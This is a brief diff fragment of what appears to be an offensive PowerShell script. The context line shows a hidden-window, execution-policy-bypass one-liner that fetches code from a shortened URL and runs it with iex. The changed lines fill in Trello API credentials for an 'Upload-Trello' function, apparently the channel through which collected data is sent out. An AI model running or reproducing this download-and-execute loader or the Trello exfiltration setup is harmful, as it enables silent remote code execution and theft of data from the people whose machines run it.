@@ -28,9 +28,9 @@ powershell -w h -NoP -Ep Bypass ;irm https://shorturl.at/wBFLV | iex
 #>
 
 # You need to changes those variables in the Upload-Trello function : 
-$idList = ""
-$key = ""
-$token = ""
+$idList = "$idList"
+$key = "$key"
+$token = "$token"
 
 # Function to handle the temporary directory
 function TempDir {
